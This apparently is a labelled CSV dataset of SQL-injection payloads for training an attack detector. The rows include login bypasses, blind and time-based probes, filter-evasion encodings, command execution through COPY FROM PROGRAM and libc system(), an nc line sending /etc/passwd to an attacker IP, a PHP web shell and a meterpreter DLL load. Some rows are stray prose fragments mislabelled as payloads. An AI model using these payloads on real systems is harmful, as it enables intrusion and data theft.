payload,label
COPY temp FROM '/etc/passwd';,anom
SELECT * FROM temp limit 1 offset 0;,anom
CREATE TABLE pentestlab (t TEXT);,anom
INSERT INTO pentestlab(t) VALUES('nc -lvvp 2346 -e /bin/bash');,anom
SELECT * FROM pentestlab;,anom
COPY pentestlab(t) TO '/tmp/pentestlab';,anom
DROP TABLE IF EXISTS cmd_exec; ,anom
CREATE TABLE cmd_exec(cmd_output text);,anom
COPY cmd_exec FROM PROGRAM 'id';,anom
SELECT * FROM cmd_exec;,anom
DROP TABLE IF EXISTS cmd_exec;,anom
"CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS '/lib/x86_64-linux-gnu/libc.so.6', 'system' LANGUAGE 'c' STRICT;",anom
SELECT system('cat /etc/passwd | nc <attacker IP> <attacker port>');,anom
select sqlite_version();      ,anom
SELECT tbl_name FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%',anom
SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name NOT LIKE 'sqlite_%' AND name ='table_name',anom
"SELECT replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(substr((substr(sql,instr(sql,'(')%2b1)),instr((substr(sql,instr(sql,'(')%2b1)),'')),""TEXT"",''),""INTEGER"",''),""AUTOINCREMENT"",''),""PRIMARY KEY"",''),""UNIQUE"",''),""NUMERIC"",''),""REAL"",''),""BLOB"",''),""NOT NULL"",''),"","",'~~') FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name NOT LIKE 'sqlite_%' AND name ='table_name'",anom
and (SELECT count(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' ) < number_of_table,anom
and (SELECT length(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name not like 'sqlite_%' limit 1 offset 0)=table_name_length_number,anom
"and (SELECT hex(substr(tbl_name,1,1)) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' limit 1 offset 0) > hex('some_char')",anom
"AND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))",anom
ATTACH DATABASE '/var/www/lol.php' AS lol;,anom
CREATE TABLE lol.pwn (dataz text);,anom
INSERT INTO lol.pwn (dataz) VALUES ('<?system($_GET['cmd']); ?>');--,anom
"UNION SELECT 1,load_extension('\\evilhost\evilshare\meterpreter.dll','DllMain');--",anom
',anom
27%,anom
"
%22
#
%23
;
%3B
)
Wildcard (*)
&apos; 
%%2727
%25%27
`+HERP
'||'DERP
'+'herp
' 'DERP
'%20'HERP
'%2B'HERP
page.asp?id=1 or 1=1
page.asp?id=1' or 1=1
page.asp?id=1 or 1=1",anom
page.asp?id=1 and 1=2,anom
Unicode character U+02BA MODIFIER LETTER DOUBLE PRIME (encoded as %CA%BA) was,anom
"transformed into U+0022 QUOTATION MARK ("")",anom
Unicode character U+02B9 MODIFIER LETTER PRIME (encoded as %CA%B9) was,anom
transformed into U+0027 APOSTROPHE ('),anom
"[""conv('a',16,2)=conv('a',16,2)""                   ,""MYSQL""],",anom
"[""connection_id()=connection_id()""                 ,""MYSQL""],",anom
"[""crc32('MySQL')=crc32('MySQL')""                   ,""MYSQL""],",anom
"[""BINARY_CHECKSUM(123)=BINARY_CHECKSUM(123)""       ,""MSSQL""],",anom
"[""@@CONNECTIONS>0""                                 ,""MSSQL""],",anom
"[""@@CONNECTIONS=@@CONNECTIONS""                     ,""MSSQL""],",anom
"[""@@CPU_BUSY=@@CPU_BUSY""                           ,""MSSQL""],",anom
"[""USER_ID(1)=USER_ID(1)""                           ,""MSSQL""],",anom
"[""ROWNUM=ROWNUM""                                   ,""ORACLE""],",anom
"[""RAWTOHEX('AB')=RAWTOHEX('AB')""                   ,""ORACLE""],",anom
"[""LNNVL(0=123)""                                    ,""ORACLE""],",anom
"[""5::int=5""                                        ,""POSTGRESQL""],",anom
"[""5::integer=5""                                    ,""POSTGRESQL""],",anom
"[""pg_client_encoding()=pg_client_encoding()""       ,""POSTGRESQL""],",anom
"[""get_current_ts_config()=get_current_ts_config()"" ,""POSTGRESQL""],",anom
"[""quote_literal(42.5)=quote_literal(42.5)""         ,""POSTGRESQL""],",anom
"[""current_database()=current_database()""           ,""POSTGRESQL""],",anom
"[""sqlite_version()=sqlite_version()""               ,""SQLITE""],",anom
"[""last_insert_rowid()>1""                           ,""SQLITE""],",anom
"[""last_insert_rowid()=last_insert_rowid()""         ,""SQLITE""],",anom
"[""val(cvar(1))=1""                                  ,""MSACCESS""],",anom
"[""IIF(ATN(2)>0,1,0) BETWEEN 2 AND 0""               ,""MSACCESS""],",anom
"[""cdbl(1)=cdbl(1)""                                 ,""MSACCESS""],",anom
"[""1337=1337"",   ""MSACCESS,SQLITE,POSTGRESQL,ORACLE,MSSQL,MYSQL""],",anom
"[""'i'='i'"",     ""MSACCESS,SQLITE,POSTGRESQL,ORACLE,MSSQL,MYSQL""],",anom
'-',anom
' ',anom
'&',anom
'^',anom
'*',anom
' or 1=1 limit 1 -- -+,anom
"'=""or'",anom
' or ''-',anom
' or '' ',anom
' or ''&',anom
' or ''^',anom
' or ''*',anom
'-||0',anom
-||0,anom
-,anom
 ,anom
&,anom
^,anom
*,anom
" or ""-",anom
" or "" ",anom
" or ""&",anom
" or ""^",anom
" or ""*",anom
or true--,anom
" or true--
' or true--
) or true--",anom
') or true--,anom
' or 'x'='x,anom
') or ('x')=('x,anom
')) or (('x'))=(('x,anom
" or x""=""x",anom
") or (x"")=(""x",anom
")) or ((x""))=((""x",anom
or 2 like 2,anom
or 1=1,anom
or 1=1--,anom
or 1=1#,anom
or 1=1/*,anom
admin' --,anom
admin' -- -,anom
admin' #,anom
admin'/*,anom
admin' or '2' LIKE '1,anom
admin' or 2 LIKE 2--,anom
admin' or 2 LIKE 2#,anom
admin') or 2 LIKE 2#,anom
admin') or 2 LIKE 2--,anom
admin') or ('2' LIKE '2,anom
admin') or ('2' LIKE '2'#,anom
admin') or ('2' LIKE '2'/*,anom
admin' or '1'='1,anom
admin' or '1'='1'--,anom
admin' or '1'='1'#,anom
admin' or '1'='1'/*,anom
admin'or 1=1 or ''=',anom
admin' or 1=1,anom
admin' or 1=1--,anom
admin' or 1=1#,anom
admin' or 1=1/*,anom
admin') or ('1'='1,anom
admin') or ('1'='1'--,anom
admin') or ('1'='1'#,anom
admin') or ('1'='1'/*,anom
admin') or '1'='1,anom
admin') or '1'='1'--,anom
admin') or '1'='1'#,anom
admin') or '1'='1'/*,anom
"1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055",anom
"admin"" --",anom
"admin"" #",anom
"admin""/*",anom
"admin"" or ""1""=""1",anom
"admin"" or ""1""=""1""--",anom
"admin"" or ""1""=""1""#",anom
"admin"" or ""1""=""1""/*",anom
"admin""or 1=1 or """"=""",anom
"admin"" or 1=1",anom
"admin"" or 1=1--",anom
"admin"" or 1=1#",anom
"admin"" or 1=1/*",anom
"admin"") or (""1""=""1",anom
"admin"") or (""1""=""1""--",anom
"admin"") or (""1""=""1""#",anom
"admin"") or (""1""=""1""/*",anom
"admin"") or ""1""=""1",anom
"admin"") or ""1""=""1""--",anom
"admin"") or ""1""=""1""#",anom
"admin"") or ""1""=""1""/*",anom
"1234 "" AND 1=0 UNION ALL SELECT ""admin"", ""81dc9bdb52d04dc20036dbd8313ed055",anom
"SELECT * FROM admin WHERE pass = '.md5($password,true).""'""",anom
"admin' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'",anom
?id=1%09and%091=1%09--,anom
?id=1%0Dand%0D1=1%0D--,anom
?id=1%0Cand%0C1=1%0C--,anom
?id=1%0Band%0B1=1%0B--,anom
?id=1%0Aand%0A1=1%0A--,anom
?id=1%A0and%A01=1%A0--,anom
?id=1/*comment*/and/**/1=1/**/--,anom
?id=(1)and(1)=(1)--,anom
"LIMIT 0,1 ",anom
"SUBSTR('SQL',1,1)",anom
"SELECT 1,2,3,4",anom
"?id=1 and substring(version(),1,1)like(5)",anom
"?id=1 and substring(version(),1,1)not in(4,3)",anom
"?id=1 and substring(version(),1,1)in(4,3)",anom
"?id=1 and substring(version(),1,1) between 3 and 4",anom
?id=1 AND 1=1,anom
?id=1 AnD 1=1,anom
?id=1 aNd 1=1,anom
AND   -> &&,anom
OR    -> ||,anom
"=     -> LIKE,REGEXP, BETWEEN, not < and not >",anom
> X   -> not between 0 and X,anom
WHERE -> HAVING,anom
select * from mysql.innodb_table_stats;,anom
show tables in dvwa;,anom
select @@innodb_version;,anom
==,anom
=,anom
',anom
' --,anom
' #,anom
' –,anom
'--,anom
'/*,anom
'#,anom
" --
 #",anom
"/*
' and 1='1
' and a='a
 or 1=1
 or true
' or ''='
 or """"=""",anom
1?) and '1?='1–,anom
"' AND 1=0 UNION ALL SELECT '', '81dc9bdb52d04dc20036dbd8313ed055",anom
" AND 1=0 UNION ALL SELECT "", 81dc9bdb52d04dc20036dbd8313ed055",anom
 and 1=1,anom
 and 1=1–,anom
' and 'one'='one,anom
' and 'one'='one–,anom
' group by password having 1=1--,anom
' group by userid having 1=1--,anom
' group by username having 1=1--,anom
 like '%',anom
 or 0=0 --,anom
 or 0=0 #,anom
 or 0=0 –,anom
' or         0=0 #,anom
